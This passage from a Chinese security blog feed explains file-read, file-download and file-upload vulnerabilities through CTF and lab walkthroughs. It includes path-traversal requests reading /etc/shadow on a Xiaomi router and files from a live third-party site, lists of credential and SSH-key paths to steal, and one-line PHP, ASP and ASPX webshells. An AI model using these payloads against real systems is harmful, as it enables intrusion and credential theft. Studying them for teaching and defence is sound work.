class="line"></span><br><span class="line">    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       80;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line"></span><br><span class="line">        #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        #</span><br><span class="line">    #    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    #    location = /50x.html &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #    &#125;</span><br><span class="line"></span><br><span class="line">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    proxy_pass   http://127.0.0.1;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    root           html;</span><br><span class="line">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        #    fastcgi_index  index.php;</span><br><span class="line">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">        #    include        fastcgi_params;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # deny access to .htaccess files, if Apache&#x27;s document root</span><br><span class="line">        # concurs with nginx&#x27;s one</span><br><span class="line">        #</span><br><span class="line">        #location ~ /\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       443 ssl;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #    ssl_certificate      cert.pem;</span><br><span class="line">    #    ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    #    ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    #    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    #    location / &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line">    include  sites-enabled/default;//包含文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /manages/admin.php?module=..././..././..././etc/nginx/sites-enabled/default&amp;name= HTTP/1.1</span><br></pre></td></tr></table></figure><p>所获取到的内容有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /online-movies &#123;</span><br><span class="line">           alias /movie/;</span><br><span class="line">           autoindex on;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>继续构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /online-movies../var/www/html/flag.php  HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/ReYczFwK9ynPWig.png" alt="image-20210416222305438"></p><p><a href="https://blog.csdn.net/kostart123/article/details/81223189?utm_source=blogkpcl4">参考</a></p><h2 id="2-2-小米路由器远程任意文件读取"><a href="#2-2-小米路由器远程任意文件读取" class="headerlink" title="2.2 小米路由器远程任意文件读取"></a>2.2 小米路由器远程任意文件读取</h2><p><a href="https://www.seebug.org/vuldb/ssvid-98122">小米路由器远程任意文件读取</a></p><p><a href="https://fofa.so/result?qbase64=5bCP57Gz6Lev55Sx5Zmo">Fofa搜索</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.1/api-third-party/download/extdisks../etc/shadow</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/Q2gfFwHPAX9qupz.png" alt="image-20210416223124397"></p><h1 id="三、文件下载漏洞–文件被下载"><a href="#三、文件下载漏洞–文件被下载" class="headerlink" title="三、文件下载漏洞–文件被下载"></a>三、文件下载漏洞–文件被下载</h1><ul><li><p>一般文件：后台首页日志等可见文件</p></li><li><p>敏感文件：</p><ul><li>配置文件（数据库，平台，）</li><li>各种接口文件</li><li>密钥信息等文件</li></ul></li><li><p><strong>文件下载方式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=”http:<span class="comment">//www.a.com/xxx.rar”&gt;下载&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: imgage/jpeg&#x27;</span>);</span><br><span class="line">    header(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">    header(<span class="string">&#x27;Content-Lengh: &#x27;</span>.filesize(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="3-1-Pikachu-之-Insafe-Filedownload-—-参数值-filename"><a href="#3-1-Pikachu-之-Insafe-Filedownload-—-参数值-filename" class="headerlink" title="3.1 Pikachu 之 Insafe Filedownload — 参数值--?filename="></a>3.1 Pikachu 之 Insafe Filedownload — <code>参数值--?filename=</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;pikachu&quot; .</span><br><span class="line">docker run -d -p8080:80 pikachu</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#图片所在位置</span></span><br><span class="line">http://pikachu/vul/unsafedownload/download/ai.png</span><br><span class="line"><span class="comment">#下载图片链接</span></span><br><span class="line">pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</span><br><span class="line"></span><br><span class="line"><span class="comment">#得知 download/ 和 execdownload.php 在 unsafedownload/目录下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#尝试下载 execdownload.php</span></span><br><span class="line">pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/9gNbeQPLd6tnR8Y.png" alt="image-20210416103358950"></p><p>下载成功</p><p>我们继续根据 execdownload.php 这个文件当中的内容获取一些文件的路径，进而继续下载，发现 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include_once $PIKA_ROOT_DIR.&quot;inc/function.php&quot;;</span><br><span class="line">$file_path=&quot;download/&#123;$_GET[&#x27;filename&#x27;]&#125;&quot;;</span><br></pre></td></tr></table></figure><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php</span><br></pre></td></tr></table></figure><p>成功下载</p><p><strong>工具扫描配置文件 ：config.inc.php 获取数据库账户密码等配置信息</strong></p><p><img src="https://i.loli.net/2021/06/06/wTDhREYW9raUn3q.png" alt="image-20210416113015851"></p><h2 id="3-2-znds-网站-–-功能点"><a href="#3-2-znds-网站-–-功能点" class="headerlink" title="3.2 znds 网站 – 功能点"></a>3.2 znds 网站 – <code>功能点</code></h2><p><a href="https://www.znds.com/">znds</a></p><p>随便下载一款软件，右键 <code>复制下载链接</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载好的文件名：</span></span><br><span class="line">    xxpt_1.<span class="number">0.5</span>_dangbei.apk</span><br><span class="line"><span class="comment">#下载链接： </span></span><br><span class="line">    http:<span class="comment">//down.znds.com/getdownurl/?s=L2Rvd24vMjAxODExMjAveHhwdF8xLjAuNV9kYW5nYmVpLmFwaw==</span></span><br><span class="line"><span class="comment">#加密部分：</span></span><br><span class="line">/down/<span class="number">20181120</span>/xxpt_1.<span class="number">0.5</span>_dangbei.apk</span><br><span class="line"><span class="comment">#清晰的URL：</span></span><br><span class="line">    http:<span class="comment">//down.znds.com/getdownurl/?s=/down/20181120/xxpt_1.0.5_dangbei.apk</span></span><br></pre></td></tr></table></figure><p><strong>信息收集，获取网站脚本类型，使用相应的脚本文件去扫描/下载</strong></p><p>示例：记得加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">尝试下载其它文件：</span><br><span class="line">http://down.znds.com/getdownurl/index.php/?s=index.php</span><br><span class="line">对应加密：</span><br><span class="line">http://down.znds.com/getdownurl/?s=aW5kZXgucGhw</span><br></pre></td></tr></table></figure><h2 id="3-3-RoarCTF2019-文件读取真题复现-–-JAVAWEB"><a href="#3-3-RoarCTF2019-文件读取真题复现-–-JAVAWEB" class="headerlink" title="3.3 RoarCTF2019-文件读取真题复现 – JAVAWEB"></a>3.3 RoarCTF2019-文件读取真题复现 – JAVAWEB</h2><p><a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20java">RoarCTF2019-文件读取真题复现</a></p><p>对 <code>help</code> 右键 <code>复制链接地址</code> ，发现是 文件下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0e351c4c-e667-4d71-8086-639b36d07883.node3.buuoj.cn/Download?filename=help.docx</span><br></pre></td></tr></table></figure><p>将 filename 参数使用 post 传递，发现可下载 <code>help.docx</code></p><p><img src="https://i.loli.net/2021/06/06/FtEn59ZComH3yjQ.png" alt="image-20210416121428172"></p><p><img src="https://i.loli.net/2021/06/06/xOwvqE3ZpmLoD8u.png" alt="image-20210416121458449"></p><p>很显然，是耍你的</p><p>Java开发 当中的一个 经常使用的配置文件 <code>WEB-INF/web.xml</code>，会记录许多信息，尝试下载</p><p><img src="https://i.loli.net/2021/06/06/NAV1aX5RgYbvziw.png" alt="image-20210416122057285"></p><p><img src="https://i.loli.net/2021/06/06/oR1MgfS46UjmDvt.png" alt="image-20210416122406641"></p><p>发现含有 Flag文件，尝试下载 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0e351c4c-e667-4d71-8086-639b36d07883.node3.buuoj.cn/Flag</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/fr6YQiKVB7qp5Fl.png" alt="image-20210416122631034"></p><p>显然，路径不正确</p><p>实际上 关键点在于 ，JAVA开发过程中，其文件是储存在它的控制器当中的，路径如下：因为Java字节码类文件（<code>.class</code>）是Java编译器编译Java源文件（<code>.java</code>）产生的“目标文件”。最终得出flag的关键文件位置为：<code>/WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/yI8CPVnWKeTUt7k.png" alt="image-20210416122938735"></p><p><img src="https://i.loli.net/2021/06/06/iHBaV47crbIFKRd.png" alt="image-20210416123133676"></p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p><strong>参数发现：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">read.xxx?filename</span><br><span class="line">down.xxx?filename</span><br><span class="line">readfile</span><br><span class="line">downfile</span><br><span class="line">&amp;readpath</span><br><span class="line">&amp;filepath</span><br><span class="line">&amp;inputfile</span><br><span class="line">&amp;url</span><br><span class="line">&amp;data</span><br><span class="line">&amp;readfile</span><br><span class="line">&amp;menu</span><br><span class="line">META-INF</span><br><span class="line">WEB-INF</span><br><span class="line">&amp;RealPath=</span><br><span class="line">&amp;FilePath=</span><br><span class="line">&amp;ﬁlepath=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;path=</span><br><span class="line">&amp;inputFile=</span><br><span class="line">&amp;url=</span><br><span class="line">&amp;urls=</span><br><span class="line">&amp;Lang=</span><br><span class="line">&amp;dis=</span><br><span class="line">&amp;data=</span><br><span class="line">&amp;readﬁle=</span><br><span class="line">&amp;ﬁlep=</span><br><span class="line">&amp;src=</span><br><span class="line">&amp;menu=</span><br><span class="line">META-INF</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><p><strong>Windows 敏感信息：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息 </span><br></pre></td></tr></table></figure><p><strong>Linux 敏感信息：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">/proc/mounts</span><br><span class="line">/porc/config.gz </span><br></pre></td></tr></table></figure><p><strong>利用思路：</strong></p><blockquote><ul><li>下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</li><li>下载各种<code>.log</code>文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</li><li>下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。</li></ul></blockquote><p>总的来说，所有与前端交互的数据都是不安全的，不能掉以轻心！                    </p><p><a href="https://blog.csdn.net/qq_43625917/article/details/102617154?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161857960316780274147367%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161857960316780274147367&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-102617154.pc_search_result_no_baidu_js&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8C%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">参考</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;概述：有关文件的常见漏洞：包括文件包含漏洞、文件读取漏洞、文件下载漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://xizhi-future.github.io/categories/Web/"/>
    
    <category term="漏洞" scheme="https://xizhi-future.github.io/categories/Web/%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="Web" scheme="https://xizhi-future.github.io/tags/Web/"/>
    
    <category term="文件包含" scheme="https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="漏洞" scheme="https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-06T14:42:17.000Z</published>
    <updated>2021-07-09T07:10:18.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、文件上传漏洞"><a href="#一、文件上传漏洞" class="headerlink" title="一、文件上传漏洞"></a>一、文件上传漏洞</h1><p><img src="https://i.loli.net/2021/06/06/xb6nmztdDVQK1OU.png" alt="在这里插入图片描述"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">成因：</span><br><span class="line">服务器配置不当导致任意文件上传</span><br><span class="line">Web应用对上传的文件没有进行足够的限制</span><br><span class="line">程序开发部署时，由于未考虑系统特性或验证而导致限制被绕过</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="1-1-条件"><a href="#1-1-条件" class="headerlink" title="1.1 条件"></a>1.1 条件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>Web服务器开启了文件上传功能，且上传api（接口）对外开放（Web用户可以访问）</span><br><span class="line"><span class="number">2.</span>Web用户对目标目录具有可写权限，甚至具有执行权限</span><br><span class="line"><span class="number">3.</span>上传的文件可执行，即Web容器可以解析我们上传的脚本</span><br></pre></td></tr></table></figure><h2 id="1-2-WebShell"><a href="#1-2-WebShell" class="headerlink" title="1.2 WebShell"></a>1.2 WebShell</h2><blockquote><p>计算机科学中，Shell俗称为“壳”，指的是“为使用者提供操作界面”的软件，即命令解释器。相当与Windows系统的cmd.exe，Linux系统中的bash。<br>Webshell本质上是在服务器端可运行的脚本文件，以Web方式（HTTP协议）去通信（传递命令消息）。它是一个网站的后门，后缀名为.php/,asp/.aspx/.jsp等。<br>即Webshell接受来自Web用户的命令，在服务器端执行。</p></blockquote><h2 id="1-3-小马"><a href="#1-3-小马" class="headerlink" title="1.3 小马"></a>1.3 小马</h2><p><a href="https://blog.csdn.net/qq_35078631/article/details/77743794?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161744278716780269856084%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161744278716780269856084&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-7-77743794.pc_search_result_no_baidu_js&utm_term=jsp++%E5%B0%8F%E9%A9%AC">小马</a></p><p><strong>原理：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">解释：</span><br><span class="line"><span class="number">1</span>.<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>--php代码的标识，使服务器按照 php代码去解析</span><br><span class="line"><span class="number">2</span>.@--当执行错误的时候，不会报错</span><br><span class="line"><span class="number">3</span>.<span class="keyword">eval</span>()--把字符串作为 php代码去执行</span><br><span class="line"><span class="number">4</span>.<span class="variable">$_POST</span>--以POST方式获取 cmd参数</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">asp:</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>eval request(&quot;cmd&quot;)<span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line">aspx:  </span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>@ Page <span class="keyword">Language</span><span class="operator">=</span>&quot;Jscript&quot;<span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);<span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line">php:</span><br><span class="line"><span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>]); ?<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>?php fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/bylfsj/article/details/101227210">变形一句话</a></p><h3 id="工具：中国菜刀"><a href="#工具：中国菜刀" class="headerlink" title="工具：中国菜刀"></a>工具：中国菜刀</h3><p>文件管理：查看，上传，下载，修改，删除，运行exe程序<br>虚拟终端：cmd窗口<br>数据库管理：需要填写相关配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>T<span class="operator">&gt;</span>MYSQL<span class="operator">&lt;</span>T<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>H<span class="operator">&gt;</span>localhost<span class="operator">&lt;</span>H<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>U<span class="operator">&gt;</span>root<span class="operator">&lt;</span>U<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>P<span class="operator">&gt;</span>密码<span class="operator">&lt;</span>P<span class="operator">&gt;</span>    为空可不写</span><br><span class="line"><span class="operator">&lt;</span>L<span class="operator">&gt;</span>utf8<span class="operator">&lt;</span>L<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><h2 id="1-4-黑白名单策略"><a href="#1-4-黑白名单策略" class="headerlink" title="1.4 黑白名单策略"></a>1.4 黑白名单策略</h2><h3 id="URLBlacklist–黑名单"><a href="#URLBlacklist–黑名单" class="headerlink" title="URLBlacklist–黑名单"></a>URLBlacklist–黑名单</h3><p>一律 禁止</p><h3 id="URLWhitelist–白名单"><a href="#URLWhitelist–白名单" class="headerlink" title="URLWhitelist–白名单"></a>URLWhitelist–白名单</h3><p>一律 允许</p><h1 id="二、防御"><a href="#二、防御" class="headerlink" title="二、防御"></a>二、防御</h1><h2 id="2-1-前端限制与绕过"><a href="#2-1-前端限制与绕过" class="headerlink" title="2.1 前端限制与绕过"></a>2.1 前端限制与绕过</h2><p>例如：检测文件后缀名等  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法一：直接修改 JS 代码，或者直接删除表单事件</span><br><span class="line">方法二：先使恶意文件后缀名符合白名单策略，然后 Burp 抓包修改文件后缀名</span><br></pre></td></tr></table></figure><h2 id="2-2-服务器端检测"><a href="#2-2-服务器端检测" class="headerlink" title="2.2 服务器端检测"></a>2.2 服务器端检测</h2><h3 id="１-MIME-类型"><a href="#１-MIME-类型" class="headerlink" title="１.MIME 类型"></a>１.MIME 类型</h3><blockquote><p><strong>MIME</strong>(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br>简单说，就是 不同的文件类型 对应于 不同的应用程序。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.docx  application<span class="operator">/</span>vnd.openxmlformats<span class="operator">-</span>officedocument.wordprocessingml.document</span><br><span class="line">.pdf  application<span class="operator">/</span>pdf</span><br><span class="line">.ppt     application<span class="operator">/</span>vnd.ms<span class="operator">-</span>powerpoint</span><br><span class="line">.pptx     application<span class="operator">/</span>vnd.openxmlformats<span class="operator">-</span>officedocument.presentationml.presentation</span><br><span class="line">.pdf  application<span class="operator">/</span>pdf</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.gif       image<span class="operator">/</span>gif</span><br><span class="line">.htm .html   text<span class="operator">/</span>html</span><br><span class="line">.jpeg .jpg   image<span class="operator">/</span>jpeg</span><br><span class="line">.js       text<span class="operator">/</span>javascript</span><br><span class="line">.png    image<span class="operator">/</span>png</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.svg     image<span class="operator">/</span>svg<span class="operator">+</span>xml</span><br><span class="line">.xml  application<span class="operator">/</span>xml</span><br><span class="line">.rar     application<span class="operator">/</span>x<span class="operator">-</span>rar<span class="operator">-</span>compressed</span><br><span class="line">.zip application<span class="operator">/</span>zip</span><br></pre></td></tr></table></figure><p>HTTP协议中，使用 <code>Content-Type 字段</code> 表示 MIME类型</p><h3 id="2-文件内容"><a href="#2-文件内容" class="headerlink" title="2.文件内容"></a>2.文件内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getimagesize() 函数:</span><br><span class="line">会测定任何 